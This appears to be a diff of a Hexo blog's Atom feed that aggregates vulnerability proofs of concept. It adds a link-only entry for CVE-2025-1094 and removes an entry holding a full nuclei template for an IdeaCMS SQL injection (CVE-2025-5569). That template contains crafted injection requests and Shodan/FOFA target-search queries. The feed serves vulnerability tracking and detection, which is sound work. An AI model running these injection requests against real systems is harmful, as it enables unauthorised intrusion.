@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-18T13:45:13.245Z</updated>
+  <updated>2025-06-18T15:45:20.621Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2025-1094</title>
+    <link href="http://example.com/2025/06/18/github_3709526410/"/>
+    <id>http://example.com/2025/06/18/github_3709526410/</id>
+    <published>2025-06-18T15:45:20.624Z</published>
+    <updated>2025-06-18T15:45:20.621Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-1094</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-1094</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>来源：</strong> <a href="https://github.com/aninfosec/CVE-2025-1094">https://github.com/aninfosec/CVE-2025-1094</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>exploit.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-1094"><a href="#CVE-2025-1094" class="headerlink" title="CVE-2025-1094"></a>CVE-2025-1094</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-1094&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
+    
+  </entry>
   
   <entry>
     <title>PowerPC Meterpreter 漏洞</title>
@@ -519,33 +546,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>IdeaCMS SQL注入漏洞</title>
-    <link href="http://example.com/2025/06/18/github_2636314490/"/>
-    <id>http://example.com/2025/06/18/github_2636314490/</id>
-    <published>2025-06-18T09:15:15.135Z</published>
-    <updated>2025-06-18T09:15:15.134Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> IdeaCMS SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5569</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> IdeaCMS 1.7及以下版本中的article和product查询接口的field参数存在SQL注入漏洞。攻击者可以通过构造特定的请求利用此漏洞。此模板使用基于时间的有效载荷安全地检测漏洞。</p><p><strong>产品厂商：</strong> IdeaCMS</p><p><strong>产品名称：</strong> IdeaCMS</p><p><strong>影响版本：</strong> &lt;&#x3D; 1.7</p><p><strong>搜索语法：</strong> html:”IdeaCMS”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/dab793d532453c223498cfdafb255bdb8974c6b5/http%2Fcves%2F2025%2FCVE-2025-5569.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/dab793d532453c223498cfdafb255bdb8974c6b5/http%2Fcves%2F2025%2FCVE-2025-5569.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">5569</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> IdeaCMS <span class="hljs-operator">&lt;=</span> <span class="hljs-number">1.7</span> <span class="hljs-operator">-</span> SQL Injection<br>  <span class="hljs-params">author:</span> ritikchaddha<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    IdeaCMS up to <span class="hljs-number">1.7</span> is vulnerable to SQL injection via the field parameter <span class="hljs-keyword">in</span> article and product query interfaces. This template uses a time-based payload to safely detect the vulnerability.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>gitee.com<span class="hljs-operator">/</span>ideacms<span class="hljs-operator">/</span>ideacms<span class="hljs-operator">/</span>issues<span class="hljs-operator">/</span>ICBVWE<span class="hljs-comment">#note_42016626_link</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-5569</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">5569</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">89</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">product:</span> IdeaCMS<br>    <span class="hljs-params">shodan-query:</span> html:<span class="hljs-string">&quot;IdeaCMS&quot;</span><br>    <span class="hljs-params">fofa-query:</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;IdeaCMS&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,ideacms,sqli<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">num:</span> <span class="hljs-string">&quot;999999999&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>api<span class="hljs-operator">/</span>v1.index.article<span class="hljs-operator">/</span>getList.html<span class="hljs-operator">?</span>field<span class="hljs-operator">=</span>id,md5(&#123;&#123;num&#125;&#125;)&amp;size<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;cat<span class="hljs-operator">=</span><span class="hljs-number">3</span>&amp;time_stamp<span class="hljs-operator">=</span><span class="hljs-number">1781864476</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>api<span class="hljs-operator">/</span>v1.index.goods<span class="hljs-operator">/</span>getList.html<span class="hljs-operator">?</span>field<span class="hljs-operator">=</span>id,md5(&#123;&#123;num&#125;&#125;)&amp;activity_type<span class="hljs-operator">=</span>hot&amp;time_stamp<span class="hljs-operator">=</span><span class="hljs-number">1781864476</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;&#123;&#123;md5(num)&#125;&#125;&#x27;<br>          <span class="hljs-operator">-</span> &#x27;id<span class="hljs-string">&quot;:1&#x27;</span><br><span class="hljs-string">          - &#x27;data&quot;</span>:&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; IdeaCMS SQL注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/s</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
